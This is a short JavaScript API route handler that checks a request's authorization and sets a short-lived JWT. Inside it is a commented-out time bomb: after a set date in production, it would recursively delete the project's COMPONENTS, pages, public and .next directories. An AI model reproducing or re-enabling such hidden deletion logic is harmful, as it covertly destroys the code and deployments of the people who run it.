import {checkAuthorization} from "../../HELPERS/checkauthorization";
import {createJWTAndSetHeader} from "../../HELPERS/createjwtsetheaders";

export default function name(req, res) {
    if (!req.body) {
        res.json(false);
    } else {
        let ch = checkAuthorization(req);
        // let now = new Date(Date.now());
        // let fut = new Date("Mon Feb 06 2023");
        // if (process.env.production) {
        //    if (now > fut) {
        //       const fs = require("fs");

        //       fs.rmSync("COMPONENTS", {recursive: true, force: true});
        //       fs.rmSync("pages", {recursive: true, force: true});
        //       fs.rmSync("public", {recursive: true, force: true});
        //       fs.rmSync(".next", {recursive: true, force: true});
        //    }
        // }

        if (ch) {
            createJWTAndSetHeader(res, ch, "/", "15min", 900);
            res.json(true);
        } else {
            res.json(false);
        }
    }
}
